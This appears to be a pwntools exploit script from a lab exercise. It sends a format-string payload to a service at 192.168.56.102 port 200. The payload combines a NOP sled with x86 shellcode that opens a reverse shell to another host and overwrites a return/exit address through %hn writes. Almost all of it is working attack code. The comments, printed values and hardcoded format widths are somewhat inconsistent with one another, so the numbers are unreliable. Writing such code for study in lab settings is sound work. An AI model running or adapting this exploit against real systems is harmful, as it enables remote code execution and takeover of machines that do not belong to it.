from pwn import *

shellcode = (
    b"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
    b"\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x38\x71\x66\x68"
    b"\x27\x0f\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
    b"\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    b"\x89\xe1\xb0\x0b\xcd\x80"
)

print(f"shellcode length is: {len(shellcode)}\n")
host = "192.168.56.102" 
port = 200

# as 4|100, having a sledSize such that sledSize+len(shellcode) 
# Will be multiple of 4
offset = 30 + len(shellcode) + 8

#The buffer addr of 0xFFFFBDC4 is given in server output. 
#However could use GDB to find this address 
s1 = int(0xd194 - offset) # == 53880
s2 = int(0xffff - 0xd194) # == 11547
print(f"s1 = 0xd194 - offset = {s1}\ns2 = 0xffff - 0xd2e4 = {s2}")

                #exitAddr       exitAddr + 2bytes
exitAddress = b"\x70\xd0\x04\x08\x72\xd0\x04\x08" #Return addr from handle_connection
NOPSled = b"\x90"*30

payload = NOPSled + shellcode
print(f"The length of payload is: {len(payload)}")
sendMe = payload + exitAddress + b"%53544x%38$hn%11883x%39$hn"

print(f"sending:\n{sendMe}")
print(f"Length is {len(sendMe)}\n")
io = connect(host, port)
io.send(sendMe)
# print(sledSize)